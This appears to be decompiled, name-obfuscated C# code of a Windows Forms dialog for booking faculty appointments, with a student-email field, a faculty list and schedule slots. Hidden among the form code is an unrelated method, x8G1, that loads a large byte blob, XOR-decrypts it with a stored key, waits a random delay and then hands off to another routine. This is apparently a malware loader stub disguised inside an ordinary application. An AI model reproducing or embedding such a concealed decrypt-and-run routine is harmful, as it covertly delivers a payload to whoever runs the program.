using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Yt3k;
using d4K;
using k9W;

namespace y8SN;

[DesignerGenerated]
public class i9S4 : Form
{
	private IContainer components;

	private Panel _Panel1;

	private Label _Label3;

	private ComboBox _Appointment;

	private TextBox _FacultyEmail;

	private Label _Label6;

	private TextBox _TextBox1;

	internal Button x;

	internal Label V;

	internal Label S;

	internal Label W;

	internal Label A;

	internal ComboBox N;

	internal ComboBox q;

	internal TextBox i;

	internal NotifyIcon c;

	public i9S4()
	{
		Bw6q();
	}

	protected override void Kt43(bool b8H3)
	{
		try
		{
			if (b8H3 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(b8H3);
		}
	}

	private void Bw6q()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_074e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0758: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(i9S4));
		Xj1m(new Panel());
		Qr6t(new Button());
		r2D0(new Label());
		Mp91(new Label());
		Hs5n(new Label());
		f4KJ(new Label());
		Bz4t(new Label());
		Ta27(new Label());
		Cd3q(new ComboBox());
		x9KR(new ComboBox());
		g4Y6(new ComboBox());
		c8C6(new TextBox());
		Ak23(new TextBox());
		r9F6(new TextBox());
		Xf14(new NotifyIcon(components));
		((Control)g7KT()).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)g7KT()).get_Controls().Add((Control)(object)g7R4());
		((Control)g7KT()).get_Controls().Add((Control)(object)q0R8());
		((Control)g7KT()).get_Controls().Add((Control)(object)Hj14());
		((Control)g7KT()).get_Controls().Add((Control)(object)x4SB());
		((Control)g7KT()).get_Controls().Add((Control)(object)o6LA());
		((Control)g7KT()).get_Controls().Add((Control)(object)Sr90());
		((Control)g7KT()).get_Controls().Add((Control)(object)Zt03());
		((Control)g7KT()).get_Controls().Add((Control)(object)Cf9d());
		((Control)g7KT()).get_Controls().Add((Control)(object)Jr0y());
		((Control)g7KT()).get_Controls().Add((Control)(object)p8L4());
		((Control)g7KT()).get_Controls().Add((Control)(object)Di76());
		((Control)g7KT()).get_Controls().Add((Control)(object)r6X0());
		((Control)g7KT()).get_Controls().Add((Control)(object)y9MW());
		((Control)g7KT()).set_Location(new Point(37, 18));
		((Control)g7KT()).set_Name("Panel1");
		((Control)g7KT()).set_Size(new Size(357, 317));
		((Control)g7KT()).set_TabIndex(0);
		((Control)g7R4()).set_Location(new Point(153, 244));
		((Control)g7R4()).set_Name("Button1");
		((Control)g7R4()).set_Size(new Size(166, 25));
		((Control)g7R4()).set_TabIndex(14);
		((ButtonBase)g7R4()).set_Text("Set Appointment");
		((ButtonBase)g7R4()).set_UseVisualStyleBackColor(true);
		q0R8().set_AutoSize(true);
		((Control)q0R8()).set_Location(new Point(47, 215));
		((Control)q0R8()).set_Name("Label5");
		((Control)q0R8()).set_Size(new Size(66, 13));
		((Control)q0R8()).set_TabIndex(9);
		q0R8().set_Text("Appointment");
		Hj14().set_AutoSize(true);
		((Control)Hj14()).set_Location(new Point(47, 174));
		((Control)Hj14()).set_Name("Label4");
		((Control)Hj14()).set_Size(new Size(52, 13));
		((Control)Hj14()).set_TabIndex(10);
		Hj14().set_Text("Schedule");
		x4SB().set_AutoSize(true);
		((Control)x4SB()).set_Location(new Point(47, 100));
		((Control)x4SB()).set_Name("Label6");
		((Control)x4SB()).set_Size(new Size(55, 13));
		((Control)x4SB()).set_TabIndex(11);
		x4SB().set_Text("Faculty ID");
		o6LA().set_AutoSize(true);
		((Control)o6LA()).set_Location(new Point(47, 135));
		((Control)o6LA()).set_Name("Label3");
		((Control)o6LA()).set_Size(new Size(69, 13));
		((Control)o6LA()).set_TabIndex(11);
		o6LA().set_Text("Faculty Email");
		Sr90().set_AutoSize(true);
		((Control)Sr90()).set_Location(new Point(47, 64));
		((Control)Sr90()).set_Name("Label2");
		((Control)Sr90()).set_Size(new Size(41, 13));
		((Control)Sr90()).set_TabIndex(12);
		Sr90().set_Text("Faculty");
		Zt03().set_AutoSize(true);
		((Control)Zt03()).set_Location(new Point(47, 29));
		((Control)Zt03()).set_Name("Label1");
		((Control)Zt03()).set_Size(new Size(32, 13));
		((Control)Zt03()).set_TabIndex(13);
		Zt03().set_Text("Email");
		((ListControl)Cf9d()).set_FormattingEnabled(true);
		Cf9d().get_Items().AddRange(new object[1] { "Grade Consultation" });
		((Control)Cf9d()).set_Location(new Point(153, 207));
		((Control)Cf9d()).set_Name("Appointment");
		((Control)Cf9d()).set_Size(new Size(166, 21));
		((Control)Cf9d()).set_TabIndex(6);
		((ListControl)Jr0y()).set_FormattingEnabled(true);
		((Control)Jr0y()).set_Location(new Point(153, 166));
		((Control)Jr0y()).set_Name("Schedule");
		((Control)Jr0y()).set_Size(new Size(166, 21));
		((Control)Jr0y()).set_TabIndex(7);
		((ListControl)p8L4()).set_FormattingEnabled(true);
		p8L4().get_Items().AddRange(new object[3] { "Patrick Mack", "Patrick Marlowe", "Maria Ramila Jimenez" });
		((Control)p8L4()).set_Location(new Point(153, 56));
		((Control)p8L4()).set_Name("FacultyName");
		((Control)p8L4()).set_Size(new Size(166, 21));
		((Control)p8L4()).set_TabIndex(8);
		((Control)Di76()).set_Location(new Point(153, 93));
		((Control)Di76()).set_Name("TextBox1");
		((Control)Di76()).set_Size(new Size(164, 20));
		((Control)Di76()).set_TabIndex(4);
		((Control)r6X0()).set_Location(new Point(153, 128));
		((Control)r6X0()).set_Name("FacultyEmail");
		((Control)r6X0()).set_Size(new Size(164, 20));
		((Control)r6X0()).set_TabIndex(4);
		((Control)y9MW()).set_Location(new Point(153, 22));
		((Control)y9MW()).set_Name("StudentEmail");
		((Control)y9MW()).set_Size(new Size(164, 20));
		((Control)y9MW()).set_TabIndex(5);
		Hm8a().set_BalloonTipTitle("Click Me!");
		Hm8a().set_Icon((Icon)componentResourceManager.GetObject("NotifyIcon1.Icon"));
		Hm8a().set_Text("NotifyIcon1");
		Hm8a().set_Visible(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(441, 347));
		((Control)this).get_Controls().Add((Control)(object)g7KT());
		((Control)this).set_Name("SetSchedule");
		((Form)this).set_Text("SetSchedule");
		((Control)g7KT()).ResumeLayout(false);
		((Control)g7KT()).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual Panel g7KT()
	{
		return _Panel1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xj1m(Panel y0E7)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		PaintEventHandler val = new PaintEventHandler(Yc4p);
		Panel panel = _Panel1;
		if (panel != null)
		{
			((Control)panel).remove_Paint(val);
		}
		_Panel1 = y0E7;
		panel = _Panel1;
		if (panel != null)
		{
			((Control)panel).add_Paint(val);
		}
	}

	[SpecialName]
	internal virtual Button g7R4()
	{
		return x;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qr6t(Button Sp27)
	{
		EventHandler eventHandler = a9J7;
		Button val = x;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (x = Sp27);
		val = x;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label q0R8()
	{
		return V;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r2D0(Label Pb9n)
	{
		Label val = (V = Pb9n);
	}

	[SpecialName]
	internal virtual Label Hj14()
	{
		return S;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Mp91(Label q3PH)
	{
		Label val = (S = q3PH);
	}

	[SpecialName]
	internal virtual Label o6LA()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f4KJ(Label z9KG)
	{
		_Label3 = z9KG;
	}

	[SpecialName]
	internal virtual Label Sr90()
	{
		return W;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Bz4t(Label d3EZ)
	{
		Label val = (W = d3EZ);
	}

	[SpecialName]
	internal virtual Label Zt03()
	{
		return A;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ta27(Label t6SG)
	{
		Label val = (A = t6SG);
	}

	[SpecialName]
	internal virtual ComboBox Cf9d()
	{
		return _Appointment;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cd3q(ComboBox Eb61)
	{
		_Appointment = Eb61;
	}

	[SpecialName]
	internal virtual ComboBox Jr0y()
	{
		return N;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x9KR(ComboBox Ai43)
	{
		ComboBox val = (N = Ai43);
	}

	[SpecialName]
	internal virtual ComboBox p8L4()
	{
		return q;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g4Y6(ComboBox Rf42)
	{
		EventHandler eventHandler = Ky8s;
		ComboBox val = q;
		if (val != null)
		{
			val.remove_SelectedIndexChanged(eventHandler);
		}
		ComboBox val2 = (q = Rf42);
		val = q;
		if (val != null)
		{
			val.add_SelectedIndexChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox r6X0()
	{
		return _FacultyEmail;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ak23(TextBox By35)
	{
		_FacultyEmail = By35;
	}

	[SpecialName]
	internal virtual TextBox y9MW()
	{
		return i;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r9F6(TextBox We7d)
	{
		TextBox val = (i = We7d);
	}

	[SpecialName]
	internal virtual Label x4SB()
	{
		return _Label6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Hs5n(Label k6L8)
	{
		_Label6 = k6L8;
	}

	[SpecialName]
	internal virtual TextBox Di76()
	{
		return _TextBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void c8C6(TextBox b8Z2)
	{
		_TextBox1 = b8Z2;
	}

	[SpecialName]
	internal virtual NotifyIcon Hm8a()
	{
		return c;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xf14(NotifyIcon q7EW)
	{
		NotifyIcon val = (c = q7EW);
	}

	private void a9J7(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(y9MW().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please enter email address.");
		}
		if (Operators.CompareString(p8L4().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please choose faculty member.");
		}
		if (Operators.CompareString(Jr0y().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please choose schedule of appointment.");
		}
		if (Operators.CompareString(Cf9d().get_Text(), "", false) == 0)
		{
			MessageBox.Show("Please choose reason of appointment.");
		}
		Eo05.Forms.t3PA().Tg6().w2F5(y9MW().get_Text(), p8L4().get_Text(), Jr0y().get_Text(), Cf9d().get_Text(), "PENDING");
		Eo05.Forms.t3PA().Tg6().w1T8(Eo05.Forms.t3PA().Bc4().History);
		Eo05.Forms.c5BS().i0LE().Kj5b(Eo05.Forms.Tk5w().Zb5f().get_Text(), Eo05.Forms.Tk5w().t4E6().get_Text(), y9MW().get_Text(), Jr0y().get_Text(), Cf9d().get_Text(), Di76().get_Text());
		Eo05.Forms.c5BS().i0LE().o8J0(Eo05.Forms.c5BS().Xc03().Pending);
		if (Operators.CompareString(p8L4().get_Text(), "Patrick Mack", false) == 0)
		{
			Eo05.Forms.Rb03().Rp8().ShowBalloonTip(500, "Click Me!", "You have an appointment request from" + Eo05.Forms.Tk5w().t4E6().get_Text(), (ToolTipIcon)1);
		}
	}

	internal static void x8G1()
	{
		byte[] array = Jp0.a8N(133632);
		checked
		{
			int g5TN = Conversions.ToInteger(Jp0.mDic[Jp0.sNum]) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = Fj9f(array[i], (byte[])Jp0.mDic[Jp0.sArray], g5TN, i);
			}
			Jp0.mDic.Add(Jp0.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			s8G.w2X();
		}
	}

	private void Ky8s(object sender, EventArgs e)
	{
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.ConditionalCompareObjectEqual(p8L4().get_SelectedItem(), (object)"Patrick Mack", false))
		{
			Jr0y().get_Items().Add((object)"Mon 8:30am-12pm");
			Jr0y().get_Items().Add((object)"Mon 4:30am-6pm");
			Jr0y().get_Items().Add((object)"Tue 1:30pm-3:30pm");
			Jr0y().get_Items().Add((object)"Wed 8:30-11:30am");
			Jr0y().get_Items().Add((object)"Thu 8:30am-12pm");
			Jr0y().set_SelectedIndex(0);
		}
		else if (Operators.ConditionalCompareObjectEqual(p8L4().get_SelectedItem(), (object)"Patrick Oliva", false))
		{
			Jr0y().get_Items().Add((object)"Mon 1:30am-3pm");
			Jr0y().get_Items().Add((object)"Tue 8:30pm-12pm");
			Jr0y().get_Items().Add((object)"Wed 8:30-11:30am");
			Jr0y().get_Items().Add((object)"Fri 8:30am-12pm");
			Jr0y().set_SelectedIndex(0);
		}
		if (Operators.ConditionalCompareObjectEqual(p8L4().get_SelectedItem(), (object)"Patrick Mack", false))
		{
			r6X0().set_Text("patrickmack@gmail.com");
		}
		else if (Operators.ConditionalCompareObjectEqual(p8L4().get_SelectedItem(), (object)"Patrick Oliva", false))
		{
			r6X0().set_Text("patrickoliva@gmail.com");
		}
		else if (Operators.ConditionalCompareObjectEqual(p8L4().get_SelectedItem(), (object)"Maria Ramila Jimenez", false))
		{
			r6X0().set_Text("mjimenez@gmail.com");
		}
		if (Operators.ConditionalCompareObjectEqual(p8L4().get_SelectedItem(), (object)"Patrick Mack", false))
		{
			Di76().set_Text("2020");
		}
		else if (Operators.ConditionalCompareObjectEqual(p8L4().get_SelectedItem(), (object)"Maria Ramila Jimenez", false))
		{
			Di76().set_Text("2021");
		}
		else
		{
			MessageBox.Show("GO!");
		}
	}

	internal static byte Fj9f(byte o7R8, byte[] Ea3g, int g5TN, int m8A4)
	{
		o7R8 = (byte)(o7R8 ^ checked((byte)(Ea3g[unchecked(m8A4 % Ea3g.Length)] ^ ((m8A4 + unchecked(g5TN % Ea3g.Length)) & g5TN))));
		return o7R8;
	}

	private void Yc4p(object sender, PaintEventArgs e)
	{
	}
}
